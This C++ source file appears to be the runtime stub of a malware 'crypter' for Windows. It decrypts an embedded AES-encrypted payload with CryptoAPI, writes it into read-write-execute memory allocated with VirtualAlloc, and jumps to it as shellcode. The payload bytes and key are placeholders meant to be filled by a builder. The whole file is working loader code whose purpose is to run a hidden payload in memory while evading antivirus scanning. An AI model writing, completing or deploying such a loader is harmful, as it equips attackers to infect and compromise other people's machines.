#include "stub.h"
#include <windows.h>
#include <vector>
#include <string>
#include <cstdint>
#include <cstring>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")

// Decrypt function using Windows CryptoAPI
std::vector<uint8_t> DecryptPayload(const BYTE* data, DWORD size, const std::string& key) {
    std::vector<uint8_t> result;
    
    if (!data || size < 16 || key.empty()) {
        return result;
    }
    
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    
    // Get crypto context
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return result;
    }
    
    // Create hash for key derivation
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return result;
    }
    
    // Hash the key
    if (!CryptHashData(hHash, (BYTE*)key.c_str(), (DWORD)key.length(), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return result;
    }
    
    // Derive AES key
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return result;
    }
    
    // Extract IV from data (first 16 bytes)
    BYTE iv[16];
    memcpy(iv, data, sizeof(iv));
    
    // Set IV
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return result;
    }
    
    // Prepare for decryption
    DWORD dataSize = size - sizeof(iv);
    std::vector<BYTE> decrypted(data + sizeof(iv), data + size);
    
    // Decrypt
    if (!CryptDecrypt(hKey, 0, TRUE, 0, decrypted.data(), &dataSize)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return result;
    }
    
    // Copy result
    result.assign(decrypted.begin(), decrypted.begin() + dataSize);
    
    // Cleanup
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    
    return result;
}

// Execute the decrypted payload
bool ExecutePayload(const std::vector<uint8_t>& payload) {
    if (payload.empty()) {
        return false;
    }
    
    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        return false;
    }
    
    // Copy payload to executable memory
    memcpy(execMem, payload.data(), payload.size());
    
    // Execute the payload
    void (*entry)() = (void(*)())execMem;
    entry();
    
    return true;
}

// Entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // The encrypted payload would be embedded here by the builder
    // For now, use placeholder data
    static const BYTE encrypted_payload[] = { 
        // This would be filled by the crypter builder
        // For testing, just use a simple placeholder
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    static const DWORD payload_size = sizeof(encrypted_payload);
    static const char encryption_key[] = "YourSecretKey32Bytes!!";
    
    // Decrypt payload
    std::vector<uint8_t> decrypted = DecryptPayload(encrypted_payload, payload_size, encryption_key);
    if (decrypted.empty()) {
        return 1;
    }
    
    // Execute the decrypted payload
    if (!ExecutePayload(decrypted)) {
        return 1;
    }
    
    return 0;
}
